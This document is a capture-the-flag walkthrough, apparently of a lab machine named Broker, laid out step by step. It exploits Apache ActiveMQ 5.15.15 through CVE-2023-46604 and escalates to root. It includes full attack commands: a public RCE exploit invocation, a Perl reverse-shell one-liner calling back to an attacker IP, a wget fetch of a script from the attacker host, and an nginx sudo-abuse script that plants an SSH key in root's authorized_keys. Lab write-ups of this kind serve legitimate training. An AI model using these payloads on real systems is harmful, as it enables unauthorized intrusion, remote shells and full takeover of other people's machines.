
## Full TCP Port Scan (Aggressive) [58s]

```bash
sudo nmap -Pn -p- -A -T4 10.129.29.124
```

```text
Starting Nmap 7.95 (https://nmap.org) at 2025-04-03 09:57 EDT
Nmap scan report for 10.129.29.124
Host is up (0.042s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/MasterBroker: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open  amqp?
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
39691/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
Device type: general purpose
Running: Linux 5.X
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   48.45 ms 10.10.16.1
2   24.81 ms 10.129.29.124

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 57.99 seconds
```

## Enumeration

### Port 80 (HTTP - ActiveMQ)
- Default credentials identified: `admin:admin`
- ActiveMQ version: 5.15.15 (vulnerable to CVE-2023-46604)
- Nikto scan confirmation:
  ```bash
  nikto -h http://10.129.29.124
  ```
  ```text
  + / - Requires Authentication for realm 'ActiveMQRealm'
  + /: Default account found for 'ActiveMQRealm' at (ID 'admin', PW 'admin')
  ```

## Exploitation

### Initial Access via CVE-2023-46604
Using [duck-sec's exploit](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell):
```bash
python3 exploit.py -i 10.129.29.124 -p 61616 -si 10.10.16.27 -sp 80
```
```text
[*] Target: 10.129.29.124:61616
[*] Serving XML at: http://10.10.16.27:80/poc.xml
[Target not responding!]$ whoami
activemq
```

### Reverse Shell Upgrade
Create reverse shell payload:
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.16.27 LPORT=1234 -f raw > shell.pl
```

Execute in pseudo-shell:
```text
[Target not responding!]$ perl -e 'use Socket;$i="10.10.16.27";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Catch shell:
```bash
nc -lvnp 1234
```
```text
activemq@broker:/opt/apache-activemq-5.15.15$
```

### User Flag
Located in luis' home:
```bash
activemq@broker:~$ cat /home/luis/user.txt
e7d4d************************
```

## Privilege Escalation

### Sudo Permissions Analysis
```bash
activemq@broker:~$ sudo -l
User activemq may run the following commands on broker:
    (ALL) NOPASSWD: /usr/sbin/nginx
```

### Nginx Configuration Exploit
Exploit script (`exploit.sh`):
```bash
#!/bin/sh
echo "[+] Creating malicious nginx config..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
    worker_connections 768;
}
http {
    server {
        listen 1339;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
EOF

echo "[+] Loading malicious configuration..."
sudo /usr/sbin/nginx -c /tmp/nginx_pwn.conf

echo "[+] Generating SSH key..."
ssh-keygen -t rsa -f id_rsa -N ""

echo "[+] Uploading public key to root's authorized_keys..."
curl -X PUT http://localhost:1339/root/.ssh/authorized_keys -d "$(cat id_rsa.pub)"

echo "[+] SSH access ready. Use: ssh -i id_rsa root@10.129.29.124"
```

Transfer and execute:
```bash
# On attacker machine
python3 -m http.server 8888

# On target
wget http://10.10.16.27:8888/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

### Root Access
Copy private key and connect:
```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.129.29.124
```
```text
Welcome to Ubuntu 22.04.3 LTS
root@broker:~# cat /root/root.txt
cb7c2************************
```
